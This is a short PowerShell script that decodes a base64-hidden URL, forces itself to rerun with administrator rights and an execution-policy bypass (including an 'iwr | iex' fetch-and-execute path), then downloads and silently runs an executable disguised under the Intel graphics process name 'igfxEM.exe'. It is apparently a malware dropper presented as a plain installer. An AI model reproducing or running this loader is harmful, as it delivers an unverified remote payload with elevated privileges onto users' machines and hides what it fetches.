$EncodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL0dhZGRldGVjaG5vL25ld3cvcmVsZWFzZXMvZG93bmxvYWQvbmV3L2lnZnhFTS5leGU="
$AppName = "igfxEM.exe"

$ErrorActionPreference = "Stop"

$isAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    if ($MyInvocation.Line -match 'http') {
        $url = ($MyInvocation.Line -match '(https?://\S+)')[1]
        Start-Process powershell.exe -Verb RunAs `
            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iwr '$url' -UseBasicParsing | iex`""
    } else {
        Start-Process powershell.exe -Verb RunAs `
            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    }
    exit
}

try {
    $ExeUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedUrl))
} catch {
    Write-Host "Error decoding URL." -ForegroundColor Red
    exit
}

$TempDir = Join-Path $env:TEMP "App_$(Get-Random)"
New-Item -ItemType Directory -Path $TempDir | Out-Null
$ExePath = Join-Path $TempDir $AppName

Write-Host "Downloading..." -ForegroundColor Cyan
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12

try {
    Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing
} catch {
    Write-Host "Download failed. Check your internet connection." -ForegroundColor Red
    Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

Write-Host "Running..." -ForegroundColor Green
Start-Process -FilePath $ExePath -WorkingDirectory $TempDir -Wait

Write-Host "Done." -ForegroundColor Green
